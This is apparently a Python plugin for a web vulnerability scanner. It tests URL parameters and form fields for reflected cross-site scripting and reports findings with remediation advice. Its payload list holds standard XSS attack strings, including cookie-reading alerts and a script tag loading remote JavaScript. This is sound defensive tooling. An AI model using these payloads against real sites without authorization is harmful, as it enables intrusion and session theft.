"""
Web Vulnerability Scanner - Cross-Site Scripting (XSS) Plugin

This plugin tests for XSS vulnerabilities by:
1. Identifying input parameters in URLs and forms
2. Testing each parameter with XSS payloads
3. Analyzing responses to detect if the payloads are reflected or stored
"""

import logging
import re
import html
from typing import Dict, List, Any, Set, Optional
from urllib.parse import urlparse, parse_qs, urlencode, unquote

import requests
from bs4 import BeautifulSoup

from plugins.base import Plugin
from scanner.http_client import HttpClient
from scanner.parser import HtmlParser, FormData
from scanner.reporter import Finding, Severity, Reporter

# Configure logging
logger = logging.getLogger('plugins.xss')

class XssPlugin(Plugin):
    """
    Plugin for detecting Cross-Site Scripting (XSS) vulnerabilities.
    """
    
    name = "xss"
    description = "Tests for Cross-Site Scripting vulnerabilities in parameters and forms"
    
    # XSS test payloads
    XSS_PAYLOADS = [
        # Basic payloads
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "<svg onload=alert('XSS')>",
        "javascript:alert('XSS')",
        "\"><script>alert('XSS')</script>",
        "\'><script>alert('XSS')</script>",
        
        # Attribute breaking payloads
        "\" onmouseover=\"alert('XSS')\"",
        "\" onfocus=\"alert('XSS')\"",
        "' onmouseover='alert(\"XSS\")'",
        
        # Script tag variations
        "<script>alert(document.domain)</script>",
        "<script>alert(document.cookie)</script>",
        
        # Event handler payloads
        "<body onload=alert('XSS')>",
        "<a onmouseover=alert('XSS')>XSS link</a>",
        
        # HTML5 payloads
        "<video src=1 onerror=alert('XSS')>",
        "<audio src=1 onerror=alert('XSS')>",
        
        # Encoded payloads
        "%3Cscript%3Ealert('XSS')%3C/script%3E",
        
        # Special cases
        "<scr<script>ipt>alert('XSS')</script>",
        "<SCRIPT SRC=http://xss.rocks/xss.js></SCRIPT>",
        
        # DOM XSS for location/referrer/cookie
        "\"><img src=x onerror=alert(document.cookie)>",
        
        # Non-alphanumeric XSS
        "'+alert('XSS')+'",
        "\"+alert('XSS')+\"",
        
        # Vectors using uncommon attributes
        "<div data-role=\"page\" data-eval=\"alert('XSS')\">",
        "<input type=\"text\" value=\"\" autofocus onfocus=\"alert('XSS')\">",
    ]
    
    # Special marker for XSS detection
    XSS_MARKER = "X55TEST"  # Unique marker to identify our payloads
    
    # Parameters that are commonly vulnerable to XSS
    COMMON_VULNERABLE_PARAMS = {
        'q', 'search', 'query', 'keyword', 'keywords', 'term', 'terms',
        'title', 'name', 'user', 'username', 'message', 'comment',
        'content', 'description', 'input', 'feedback', 'email',
        'subject', 'text', 'body', 'url', 'redirect', 'return',
        'returnUrl', 'next', 'target', 'redir', 'redirUrl'
    }
    
    def __init__(self, reporter: Reporter = None):
        """Initialize the XSS plugin."""
        super().__init__(reporter)
        self.tested_urls: Set[str] = set()  # Track already tested URLs to avoid duplication
    
    def scan(self, target_url: str, http_client: HttpClient) -> List[Finding]:
        """
        Scan for XSS vulnerabilities.
        
        Args:
            target_url: URL to scan
            http_client: HTTP client for making requests
            
        Returns:
            List[Finding]: List of findings
        """
        findings = []
        
        # Skip if already tested
        if target_url in self.tested_urls:
            return findings
        
        # Add to tested URLs
        self.tested_urls.add(target_url)
        
        self.logger.info(f"Scanning {target_url} for XSS vulnerabilities")
        
        try:
            # Test URL parameters
            url_findings = self._test_url_parameters(target_url, http_client)
            findings.extend(url_findings)
            
            # Get the response and parse the page
            response = http_client.get(target_url)
            if not response.ok:
                self.logger.warning(f"Failed to fetch {target_url}: {response.status_code}")
                return findings
            
            # Parse HTML
            parser = HtmlParser(target_url)
            soup = parser.parse_html(response.text)
            
            # Extract and test forms
            forms = parser.extract_forms(soup, target_url)
            form_findings = self._test_forms(forms, http_client)
            findings.extend(form_findings)
            
        except Exception as e:
            self.logger.error(f"Error scanning {target_url} for XSS: {e}")
        
        # Report findings
        for finding in findings:
            self.report_finding(finding)
        
        return findings
    
    def _test_url_parameters(self, url: str, http_client: HttpClient) -> List[Finding]:
        """
        Test URL parameters for XSS vulnerabilities.
        
        Args:
            url: URL to test
            http_client: HTTP client for making requests
            
        Returns:
            List[Finding]: List of findings
        """
        findings = []
        parsed_url = urlparse(url)
        query_params = parse_qs(parsed_url.query)
        
        if not query_params:
            return findings
        
        # Test each parameter
        for param, values in query_params.items():
            # Skip testing if parameter doesn't seem injectable
            if not self._is_likely_injectable(param):
                continue
                
            # Original value
            original_value = values[0] if values else ""
            
            # Add our marker to payloads for easier detection
            marker_payloads = []
            for payload in self.XSS_PAYLOADS:
                if self.XSS_MARKER not in payload:
                    marker_payload = payload.replace("XSS", self.XSS_MARKER)
                    marker_payloads.append(marker_payload)
            
            # Test each payload
            for payload in marker_payloads:
                # Create a new URL with the XSS payload
                new_params = query_params.copy()
                new_params[param] = [payload]
                query_string = urlencode(new_params, doseq=True)
                
                path = parsed_url.path or '/'
                new_url = f"{parsed_url.scheme}://{parsed_url.netloc}{path}?{query_string}"
                
                try:
                    # Send the request with the payload
                    response = http_client.get(new_url)
                    
                    # Check if the payload is reflected
                    if self._is_payload_reflected(payload, response.text):
                        finding = Finding(
                            title=f"Reflected XSS in URL parameter '{param}'",
                            description=(
                                f"The parameter '{param}' appears to be vulnerable to Cross-Site Scripting (XSS). "
                                f"The application reflects unfiltered user input in the response."
                            ),
                            url=url,
                            severity=Severity.HIGH,
                            plugin_name=self.name,
                            evidence=(
                                f"Payload: {payload}\n\n"
                                f"Reflection context: {self._get_reflection_context(payload, response.text)}"
                            ),
                            request_data={"url": new_url, "method": "GET"},
                            response_data={"status": response.status_code, "length": len(response.text)},
                            remediation=(
                                "1. Implement proper output encoding based on the context (HTML, JS, CSS, URL).\n"
                                "2. Use Content Security Policy (CSP) headers.\n"
                                "3. Use framework's built-in XSS protection mechanisms.\n"
                                "4. Apply input validation and sanitization.\n"
                                "5. Consider using the HTTPOnly flag for sensitive cookies."
                            ),
                            cwe_id="79"  # CWE-79: Cross-site Scripting
                        )
                        findings.append(finding)
                        
                        # Stop testing this parameter after finding a vulnerability
                        break
                        
                except Exception as e:
                    self.logger.error(f"Error testing {new_url} with payload {payload}: {e}")
        
        return findings
    
    def _test_forms(self, forms: List[FormData], http_client: HttpClient) -> List[Finding]:
        """
        Test forms for XSS vulnerabilities.
        
        Args:
            forms: List of forms to test
            http_client: HTTP client for making requests
            
        Returns:
            List[Finding]: List of findings
        """
        findings = []
        
        for form in forms:
            # Skip forms with no inputs
            if not form.inputs:
                continue
            
            # Prepare form data
            form_data = {}
            injectable_fields = []
            
            for input_name, attrs in form.inputs.items():
                # Skip non-text inputs
                input_type = attrs.get('type', 'text').lower()
                if input_type in ['checkbox', 'radio', 'button', 'submit', 'image', 'file']:
                    continue
                
                # Add empty value
                form_data[input_name] = ''
                
                # Mark as injectable if it seems vulnerable
                if self._is_likely_injectable(input_name):
                    injectable_fields.append(input_name)
            
            # Skip if no injectable fields
            if not injectable_fields:
                continue
            
            # Add our marker to payloads for easier detection
            marker_payloads = []
            for payload in self.XSS_PAYLOADS:
                if self.XSS_MARKER not in payload:
                    marker_payload = payload.replace("XSS", self.XSS_MARKER)
                    marker_payloads.append(marker_payload)
            
            # Test each injectable field
            for input_name in injectable_fields:
                # Test each payload
                for payload in marker_payloads:
                    # Create new form data with the payload
                    test_data = form_data.copy()
                    test_data[input_name] = payload
                    
                    try:
                        # Send the request with the payload
                        if form.method.upper() == 'POST':
                            response = http_client.post(form.action, data=test_data)
                        else:
                            # For GET, encode the parameters in the URL
                            query_string = urlencode(test_data)
                            url = f"{form.action}?{query_string}" if '?' not in form.action else f"{form.action}&{query_string}"
                            response = http_client.get(url)
                        
                        # Check if the payload is reflected
                        if self._is_payload_reflected(payload, response.text):
                            finding = Finding(
                                title=f"Reflected XSS in form field '{input_name}'",
                                description=(
                                    f"The form field '{input_name}' on {form.action} appears to be vulnerable "
                                    f"to Cross-Site Scripting (XSS). The application reflects unfiltered user input in the response."
                                ),
                                url=form.action,
                                severity=Severity.HIGH,
                                plugin_name=self.name,
                                evidence=(
                                    f"Form method: {form.method}\nField: {input_name}\nPayload: {payload}\n\n"
                                    f"Reflection context: {self._get_reflection_context(payload, response.text)}"
                                ),
                                request_data={"url": form.action, "method": form.method, "data": test_data},
                                response_data={"status": response.status_code, "length": len(response.text)},
                                remediation=(
                                    "1. Implement proper output encoding based on the context (HTML, JS, CSS, URL).\n"
                                    "2. Use Content Security Policy (CSP) headers.\n"
                                    "3. Use framework's built-in XSS protection mechanisms.\n"
                                    "4. Apply input validation and sanitization.\n"
                                    "5. Consider using the HTTPOnly flag for sensitive cookies."
                                ),
                                cwe_id="79"  # CWE-79: Cross-site Scripting
                            )
                            findings.append(finding)
                            
                            # Stop testing this field after finding a vulnerability
                            break
                            
                    except Exception as e:
                        self.logger.error(f"Error testing form {form.action} field {input_name} with payload {payload}: {e}")
        
        return findings
    
    def _is_payload_reflected(self, payload: str, content: str) -> bool:
        """
        Check if the XSS payload is reflected in the response.
        
        Args:
            payload: XSS payload
            content: Response content
            
        Returns:
            bool: True if payload is reflected, False otherwise
        """
        # Check for exact payload reflection
        if payload in content:
            return True
            
        # Check for decoded/unescaped version
        decoded_payload = unquote(payload)
        if decoded_payload in content:
            return True
            
        # Check for partial reflection (some characters might be filtered)
        if self.XSS_MARKER in content:
            # Check if it's in a script context
            script_pattern = re.compile(r"<script[^>]*>.*?" + re.escape(self.XSS_MARKER) + r".*?</script>", re.DOTALL | re.IGNORECASE)
            if script_pattern.search(content):
                return True
                
            # Check if it's in an event handler
            event_pattern = re.compile(r"on\w+\s*=\s*(['\"]).*?" + re.escape(self.XSS_MARKER) + r".*?\1", re.IGNORECASE)
            if event_pattern.search(content):
                return True
                
            # Check if it's in a dangerous HTML attribute
            attr_pattern = re.compile(r"<[^>]+\s+(?:src|href|data|action)\s*=\s*(['\"]).*?" + re.escape(self.XSS_MARKER) + r".*?\1[^>]*>", re.IGNORECASE)
            if attr_pattern.search(content):
                return True
        
        # Check for HTML-encoded version
        encoded_payload = html.escape(payload)
        if encoded_payload in content and encoded_payload != payload:
            # If we find the HTML-encoded version, we need to check if it's properly escaped
            # or if it can still be executed in certain contexts
            
            # Check for JS contexts where HTML encoding isn't enough
            js_pattern = re.compile(r"<script[^>]*>.*?" + re.escape(html.escape(self.XSS_MARKER)) + r".*?</script>", re.DOTALL | re.IGNORECASE)
            if js_pattern.search(content):
                return True
                
            # Check for dangerous attribute contexts
            attr_pattern = re.compile(r"<[^>]+\s+(?:on\w+|src|href|data|action)\s*=\s*(['\"]).*?" + re.escape(html.escape(self.XSS_MARKER)) + r".*?\1[^>]*>", re.IGNORECASE)
            if attr_pattern.search(content):
                return True
        
        return False
    
    def _get_reflection_context(self, payload: str, content: str, context_length: int = 200) -> str:
        """
        Get the context in which the payload is reflected.
        
        Args:
            payload: XSS payload
            content: Response content
            context_length: Length of context to extract
            
        Returns:
            str: Context around the reflected payload
        """
        # Try to find the payload or marker
        test_strings = [payload, unquote(payload), self.XSS_MARKER, html.escape(payload)]
        
        for test in test_strings:
            if test in content:
                # Find the position of the reflection
                pos = content.find(test)
                if pos != -1:
                    # Get context around the reflection
                    start = max(0, pos - context_length // 2)
                    end = min(len(content), pos + len(test) + context_length // 2)
                    
                    # Get the HTML context
                    context = content[start:end].strip()
                    
                    # Try to identify the HTML element type
                    html_context = self._identify_html_context(content, pos)
                    return f"{html_context}\n\nContext: {context}"
        
        return "Payload reflected but context could not be determined"
    
    def _identify_html_context(self, content: str, position: int) -> str:
        """
        Identify the HTML context in which the payload is reflected.
        
        Args:
            content: HTML content
            position: Position of the reflection
            
        Returns:
            str: Description of the HTML context
        """
        # Extract a larger chunk around the position
        start = max(0, position - 500)
        end = min(len(content), position + 500)
        chunk = content[start:end]
        
        # Try to determine if we're in a script tag
        if re.search(r"<script[^>]*>.*?</script>", chunk, re.DOTALL | re.IGNORECASE):
            return "Context: JavaScript (inside script tag)"
            
        # Check for event handler attributes
        if re.search(r"on\w+\s*=\s*(['\"])", chunk, re.IGNORECASE):
            return "Context: HTML attribute (event handler)"
            
        # Check for href, src attributes
        if re.search(r"(?:src|href|data|action)\s*=\s*(['\"])", chunk, re.IGNORECASE):
            return "Context: HTML attribute (URL)"
            
        # Check if we're inside a tag
        if re.search(r"<[^>]+\s+[^>]*$", content[:position], re.IGNORECASE) and re.search(r"^[^<]*>", content[position:], re.IGNORECASE):
            return "Context: Inside HTML tag"
            
        # If we're between tags, we're in HTML content
        if re.search(r">[^<]*$", content[:position], re.IGNORECASE) and re.search(r"^[^>]*<", content[position:], re.IGNORECASE):
            return "Context: HTML content (between tags)"
            
        # Default context
        return "Context: Unknown/Text"
    
    def _is_likely_injectable(self, param_name: str) -> bool:
        """
        Determine if a parameter is likely to be injectable.
        
        Args:
            param_name: Name of the parameter
            
        Returns:
            bool: True if parameter is likely injectable, False otherwise
        """
        param_lower = param_name.lower()
        
        # Common vulnerable parameter names
        if param_lower in self.COMMON_VULNERABLE_PARAMS:
            return True
            
        # Parameters that often contain user-generated content
        if any(name in param_lower for name in ['user', 'name', 'content', 'message', 'comment', 'text', 'title', 'description', 'search']):
            return True
            
        # Parameters related to URLs/redirection
        if any(name in param_lower for name in ['url', 'link', 'redirect', 'return', 'next', 'target', 'goto']):
            return True
            
        # Default behavior - test parameters with longer names that might be text fields
        return len(param_name) > 3
